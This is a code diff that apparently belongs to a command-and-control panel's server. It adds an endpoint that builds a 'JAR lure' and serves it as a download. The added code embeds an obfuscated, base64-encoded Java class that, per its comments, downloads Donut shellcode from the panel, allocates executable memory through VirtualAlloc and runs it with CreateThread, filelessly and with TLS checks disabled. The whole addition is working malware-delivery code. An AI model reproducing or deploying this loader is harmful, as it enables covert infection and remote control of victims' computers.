@@ -640,6 +640,138 @@ export async function handleBuildRoutes(
       });
     }
 
+    // ── JAR lure endpoint — fileless agent loader via JNA/VirtualAlloc+CreateThread ─
+    if (req.method === "GET" && url.pathname.match(/^\/api\/build\/jar\//)) {
+      requirePermission(user, "clients:build");
+
+      const rawName = url.pathname.split("/api/build/jar/")[1] || "";
+      let fileName: string;
+      try { fileName = decodeURIComponent(rawName); } catch {
+        return Response.json({ error: "Bad request" }, { status: 400 });
+      }
+      if (!fileName || fileName.includes("\0") || fileName.includes("/") || fileName.includes("\\"))
+        return Response.json({ error: "File not found" }, { status: 404 });
+
+      const rootDir = resolveRuntimeRoot();
+      const distRoot = path.resolve(rootDir, "dist-clients");
+      const filePath = path.resolve(distRoot, fileName);
+      if (!filePath.startsWith(distRoot + path.sep))
+        return Response.json({ error: "File not found" }, { status: 404 });
+      if (!fs.existsSync(filePath))
+        return Response.json({ error: "File not found" }, { status: 404 });
+
+      // Derive C2 base URL and build the shellcode download URL baked into the JAR
+      const proto = req.headers.get("x-forwarded-proto") || "https";
+      const host  = req.headers.get("x-forwarded-host") || req.headers.get("host") || "localhost:5173";
+      const c2url = `${proto}://${host}`;
+      const shellcodeUrl = `${c2url}/api/build/shellcode/${encodeURIComponent(fileName)}`;
+
+      // Main.class: reads /assets/url.txt, downloads Donut shellcode, VirtualAlloc RWX,
+      // writes shellcode, CreateThread — fully fileless via JNA reflection (ADD+90 encoded).
+      // Compiled: javac -source 8 -target 8 Main.java  (class file version 52 / Java 8)
+      const MAIN_CLASS_B64 =
+        "yv66vgAAADQA1QoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClW" +
+        "BwAIAQAQamF2YS9sYW5nL1N0cmluZwoABwAKDAAFAAsBAAUoW0MpVgoADQAOBwAPDAAQABEBAA9q" +
+        "YXZhL2xhbmcvQ2xhc3MBAApnZXRNZXRob2RzAQAdKClbTGphdmEvbGFuZy9yZWZsZWN0L01ldGhv" +
+        "ZDsKABMAFAcAFQwAFgAXAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHZ2V0TmFtZQEAFCgp" +
+        "TGphdmEvbGFuZy9TdHJpbmc7CgAHABkMABoAGwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVj" +
+        "dDspWgoAEwAdDAAeAB8BABFnZXRQYXJhbWV0ZXJUeXBlcwEAFCgpW0xqYXZhL2xhbmcvQ2xhc3M7" +
+        "CgAhACIHACMMABoAJAEAEGphdmEvdXRpbC9BcnJheXMBACkoW0xqYXZhL2xhbmcvT2JqZWN0O1tM" +
+        "amF2YS9sYW5nL09iamVjdDspWgcAJgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtCgAl" +
+        "AAMKACkAKgcAKwwALAAtAQATamF2YS9pby9JbnB1dFN0cmVhbQEABHJlYWQBAAUoW0IpSQoAJQAv" +
+        "DAAwADEBAAV3cml0ZQEAByhbQklJKVYKACkAMwwANAAGAQAFY2xvc2UKACUANgwANwA4AQALdG9C" +
+        "eXRlQXJyYXkBAAQoKVtCCgA6ADsHADwMAD0ABgEABE1haW4BAANydW4HAD8BABNqYXZhL2xhbmcv" +
+        "RXhjZXB0aW9uCABBAQAPL2Fzc2V0cy91cmwudHh0CgANAEMMAEQARQEAE2dldFJlc291cmNlQXNT" +
+        "dHJlYW0BACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2lvL0lucHV0U3RyZWFtOwoAOgBHDABI" +
+        "AEkBAAJyZAEAGShMamF2YS9pby9JbnB1dFN0cmVhbTspW0IIAEsBAAVVVEYtOAoABwBNDAAFAE4B" +
+        "ABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgoABwBQDABRABcBAAR0cmltBwBTAQAaamF2YXgvbmV0" +
+        "L3NzbC9UcnVzdE1hbmFnZXIHAFUBAAZNYWluJDEKAFQAAwgAWAEAA1RMUwoAWgBbBwBcDABdAF4B" +
+        "ABhqYXZheC9uZXQvc3NsL1NTTENvbnRleHQBAAtnZXRJbnN0YW5jZQEALihMamF2YS9sYW5nL1N0" +
+        "cmluZzspTGphdmF4L25ldC9zc2wvU1NMQ29udGV4dDsHAGABABpqYXZhL3NlY3VyaXR5L1NlY3Vy" +
+        "ZVJhbmRvbQoAXwADCgBaAGMMAGQAZQEABGluaXQBAFcoW0xqYXZheC9uZXQvc3NsL0tleU1hbmFn" +
+        "ZXI7W0xqYXZheC9uZXQvc3NsL1RydXN0TWFuYWdlcjtMamF2YS9zZWN1cml0eS9TZWN1cmVSYW5k" +
+        "b207KVYKAFoAZwwAaABpAQAQZ2V0U29ja2V0RmFjdG9yeQEAIigpTGphdmF4L25ldC9zc2wvU1NM" +
+        "U29ja2V0RmFjdG9yeTsKAGsAbAcAbQwAbgBvAQAgamF2YXgvbmV0L3NzbC9IdHRwc1VSTENvbm5l" +
+        "Y3Rpb24BABpzZXREZWZhdWx0U1NMU29ja2V0RmFjdG9yeQEAIyhMamF2YXgvbmV0L3NzbC9TU0xT" +
+        "b2NrZXRGYWN0b3J5OylWBwBxAQAGTWFpbiQyCgBwAAMKAGsAdAwAdQB2AQAac2V0RGVmYXVsdEhv" +
+        "c3RuYW1lVmVyaWZpZXIBACMoTGphdmF4L25ldC9zc2wvSG9zdG5hbWVWZXJpZmllcjspVgcAeAEA" +
+        "DGphdmEvbmV0L1VSTAoAdwB6DAAFAHsBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYKAHcAfQwAfgB/" +
+        "AQAOb3BlbkNvbm5lY3Rpb24BABooKUxqYXZhL25ldC9VUkxDb25uZWN0aW9uOwoAgQCCBwCDDACE" +
+        "AIUBABZqYXZhL25ldC9VUkxDb25uZWN0aW9uAQARc2V0Q29ubmVjdFRpbWVvdXQBAAQoSSlWAwAB" +
+        "1MAKAIEAiAwAiQCFAQAOc2V0UmVhZFRpbWVvdXQKAIEAiwwAjACNAQAOZ2V0SW5wdXRTdHJlYW0B" +
+        "ABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwoAOgCPDACQAJEBAAF4AQAWKFtJKUxqYXZhL2xhbmcv" +
+        "U3RyaW5nOwoADQCTDACUAJUBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9s" +
+        "YW5nL0NsYXNzOwoAOgCXDACYAJkBAAJnbQEAUShMamF2YS9sYW5nL0NsYXNzO0xqYXZhL2xhbmcv" +
+        "U3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwcAmwEA" +
+        "E1tMamF2YS9sYW5nL09iamVjdDsKAA0AnQwAngCfAQAIZ2V0RmllbGQBAC0oTGphdmEvbGFuZy9T" +
+        "dHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsKAKEAogcAowwApAClAQAXamF2YS9sYW5n" +
+        "L3JlZmxlY3QvRmllbGQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2Jq" +
+        "ZWN0OwoAEwCnDACoAKkBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcv" +
+        "T2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKAKsArAcArQwArgCvAQAOamF2YS9sYW5nL0xvbmcB" +
+        "AAd2YWx1ZU9mAQATKEopTGphdmEvbGFuZy9Mb25nOwoAsQCyBwCzDACuALQBABFqYXZhL2xhbmcv" +
+        "SW50ZWdlcgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsKAAIAtgwAtwC4AQAIZ2V0Q2xhc3MBABMo" +
+        "KUxqYXZhL2xhbmcvQ2xhc3M7BwC6AQACW0IKALwAvQcAvgwAvwDAAQAQamF2YS9sYW5nL1RocmVh" +
+        "ZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwoAvADCDADDAAYBAARqb2lu" +
+        "AQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHAMgBAAJbQwcAygEAG1tM" +
+        "amF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEACVNpZ25hdHVyZQEAVyhMamF2YS9sYW5nL0NsYXNz" +
+        "PCo+O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzPCo+OylMamF2YS9sYW5nL3Jl" +
+        "ZmxlY3QvTWV0aG9kOwEACkV4Y2VwdGlvbnMBAARtYWluAQAWKFtMamF2YS9sYW5nL1N0cmluZzsp" +
+        "VgcA0QEAHVtMamF2YXgvbmV0L3NzbC9UcnVzdE1hbmFnZXI7AQAKU291cmNlRmlsZQEACU1haW4u" +
+        "amF2YQEADElubmVyQ2xhc3NlcwAhADoAAgAAAAAABgABAAUABgABAMQAAAAdAAEAAQAAAAUqtwAB" +
+        "sQAAAAEAxQAAAAYAAQAAAAEACACQAJEAAQDEAAAAWAAEAAMAAAAmKr68BUwDPRwqvqIAEyscKhwu" +
+        "EFpkklWEAgGn/+27AAdZK7cACbAAAAACAMUAAAAOAAMAAAAFAAUABgAdAAcAxgAAAAwAAv0ABwcA" +
+        "xwH6ABUAiACYAJkAAgDEAAAAeAACAAcAAAA8KrYADE4tvjYEAzYFFQUVBKIAKi0VBTI6BhkGtgAS" +
+        "K7YAGJkAEhkGtgAcLLgAIJkABhkGsIQFAaf/1QGwAAAAAgDFAAAAFgAFAAAADAAZAA0AMQAOADQA" +
+        "DAA6ABAAxgAAAA4AA/4ADAcAyQEBJ/gABQDLAAAAAgDMAAgASABJAAIAxAAAAGkABAAEAAAALLsA" +
+        "JVm3ACdMESAAvAhNKiy2AChZPgKfAA0rLAMdtgAup//uKrYAMiu2ADWwAAAAAgDFAAAAFgAFAAAA" +
+        "FQAIABYADgAYACMAGQAnABoAxgAAAA8AAv0ADgcAJQcAufwAFAEAzQAAAAQAAQA+AAkAzgDPAAEA" +
+        "xAAAADkAAQACAAAACLgAOacABEyxAAEAAAADAAYAPgACAMUAAAAKAAIAAAAeAAcAHwDGAAAABwAC" +
+        "RgcAPgAACAA9AAYAAgDEAAAF4AAKABMAAASREjoSQLYAQksqxwAEsbsAB1kquABGEkq3AEy2AE9M" +
+        "BL0AUlkDuwBUWbcAVlNNEle4AFlOLQEsuwBfWbcAYbYAYi22AGa4AGq7AHBZtwByuABzuwB3WSu3" +
+        "AHm2AHw6BBkEEXUwtgCAGQQShrYAhxkEtgCKuABGOgUQFLwKWQMRAL1PWQQRAMlPWQURAMdPWQYR" +
+        "AIhPWQcRAM1PWQgRAM9PWRAGEQDIT1kQBxEAiE9ZEAgRAMRPWRAJEQDIT1kQChEAu09ZEAsRAIhP" +
+        "WRAMEQCgT1kQDREAz09ZEA4RAMhPWRAPEQC9T1kQEBEAzk9ZEBERAMNPWRASEQDJT1kQExEAyE+4" +
+        "AI64AJI6BhkGEAu8ClkDEQDBT1kEEQC/T1kFEQDOT1kGEQCgT1kHEQDPT1kIEQDIT1kQBhEAvU9Z" +
+        "EAcRAM5PWRAIEQDDT1kQCREAyU9ZEAoRAMhPuACOBb0ADVkDEgdTWQQSB1O4AJY6BxkGEAa8ClkD" +
+        "EQDDT1kEEQDIT1kFEQDQT1kGEQDJT1kHEQDFT1kIEQC/T7gAjgW9AA1ZAxINU1kEEppTuACWOggQ" +
+        "E7wKWQMRAL1PWQQRAMlPWQURAMdPWQYRAIhPWQcRAM1PWQgRAM9PWRAGEQDIT1kQBxEAiE9ZEAgR" +
+        "AMRPWRAJEQDIT1kQChEAu09ZEAsRAIhPWRAMEQCqT1kQDREAyU9ZEA4RAMNPWRAPEQDIT1kQEBEA" +
+        "zk9ZEBERAL9PWRASEQDMT7gAjrgAkjoJGQkHvApZAxEAqE9ZBBEAr09ZBREApk9ZBhEApk+4AI62" +
+        "AJwBtgCgOgoQCLwKWQMRAMVPWQQRAL9PWQURAMxPWQYRAMhPWQcRAL9PWQgRAMZPWRAGEQCNT1kQ" +
+        "BxEAjE+4AI46CxkHAQW9AAJZAxkLU1kEEAy8ClkDEQCwT1kEEQDDT1kFEQDMT1kGEQDOT1kHEQDP" +
+        "T1kIEQC7T1kQBhEAxk9ZEAcRAJtPWRAIEQDGT1kQCREAxk9ZEAoRAMlPWRALEQC9T7gAjlO2AKY6" +
+        "DBkIGQwFvQACWQMZCVNZBAe9AAJZAxkKU1kEGQW+hbgAqlNZBREwALgAsFNZBhBAuACwU1O2AKY6" +
+        "DRkNxwAEsQE6DhkNtgC1tgAMOg8ZD742EAM2ERURFRCiAFwZDxURMjoSGRK2ABIIvApZAxEA0U9Z" +
+        "BBEAzE9ZBREAw09ZBhEAzk9ZBxEAv0+4AI62ABiZACAZErYAHL4HoAAWGRK2ABwEMhK5pgAKGRI6" +
+        "DqcACYQRAaf/oxkOxwAEsRkOGQ0HvQACWQMJuACqU1kEGQVTWQUDuACwU1kGGQW+uACwU7YAplcZ" +
+        "BwEFvQACWQMZC1NZBBAMvApZAxEAnU9ZBBEAzE9ZBREAv09ZBhEAu09ZBxEAzk9ZCBEAv09ZEAYR" +
+        "AK5PWRAHEQDCT1kQCBEAzE9ZEAkRAL9PWRAKEQC7T1kQCxEAvk+4AI5TtgCmOg8ZCBkPBb0AAlkD" +
+        "GQlTWQQQBr0AAlkDGQpTWQQJuACqU1kFGQ1TWQYZClNZBwO4ALBTWQgZClNTtgCmV7gAu7YAwbEA" +
+        "AAACAMUAAAC+AC8AAAAjAAgAJAANACUAHgAoAC0ALQAzAC4AQAAvAEcAMABRADcAXgA4AGYAOQBt" +
+        "ADoAdwA+AQkAQgFWAEMBZwBCAWwARgGWAEcBpwBGAawASwI3AE8CYABSApsAVgL7AFcC/wBWAwQA" +
+        "WAMiAFkDOABYAz0AWgNDAF0DRgBeA2YAXwOXAGADoQBhA6sAYgOvAGMDsgBeA7gAZgO+AGcD5gBr" +
+        "BEYAbARKAGsETwBtBGsAbgSGAG0EigBxBJAAcgDGAAAAeQAG/AANBwAp/wM1AA4HACkHAAcHANAH" +
+        "AFoHAIEHALkHAA0HABMHABMHAA0HAAIHAAcHAAIHAAIAAP8AFAASBwApBwAHBwDQBwBaBwCBBwC5" +
+        "BwANBwATBwATBwANBwACBwAHBwACBwACBwATBwDJAQEAAPsAWfgABQUAzQAAAAQAAQA+AAIA0gAA" +
+        "AAIA0wDUAAAAEgACAFQAAAAAAAAAcAAAAAAAAA==";
+
+      const AdmZip = (await import("adm-zip")).default;
+      const zip = new AdmZip();
+      const manifest = "Manifest-Version: 1.0\r\nMain-Class: Main\r\n\r\n";
+      zip.addFile("META-INF/MANIFEST.MF", Buffer.from(manifest, "utf-8"));
+      zip.addFile("Main.class", Buffer.from(MAIN_CLASS_B64, "base64"));
+      zip.addFile("assets/url.txt", Buffer.from(shellcodeUrl, "utf-8"));
+      const jarBuf = zip.toBuffer();
+
+      const baseName = fileName.replace(/\.[^.]+$/, "");
+      return new Response(jarBuf, {
+        headers: {
+          "Content-Type": "application/java-archive",
+          "Content-Disposition": `attachment; filename="${baseName}.jar"`,
+        },
+      });
+    }
+
     if (req.method === "POST" && url.pathname === "/api/build/update-eligible") {
       requirePermission(user, "clients:build");
 
